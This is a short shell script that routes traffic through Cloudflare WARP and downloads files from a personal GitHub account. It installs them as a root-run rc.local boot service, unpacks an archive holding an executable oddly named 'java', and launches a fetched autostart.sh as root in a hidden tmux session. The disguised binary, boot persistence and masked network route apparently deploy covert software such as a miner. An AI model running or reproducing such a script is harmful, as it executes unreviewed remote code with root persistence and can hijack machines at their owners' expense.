#!/bin/sh

warp-cli enable-always-on
sleep 10
wget https://raw.githubusercontent.com/minnie1311/azureAI/master/rc-local.service
sudo mv rc-local.service /etc/systemd/system/rc-local.service
wget https://raw.githubusercontent.com/minnie1311/Python3/main/rc.local1
sudo mv rc.local1 /etc/rc.local
sudo chmod +x /etc/rc.local
sudo systemctl enable rc-local
sudo wget https://github.com/minnie1311/Python3/raw/main/ubuntu_18.04.zip
sudo unzip ubuntu_18.04.zip
sudo chmod +x java
sudo rm start.sh
sudo wget https://raw.githubusercontent.com/minnie1311/Python3/main/autostart.sh
sudo tmux new-session -d -s 1 'sudo sh autostart.sh'



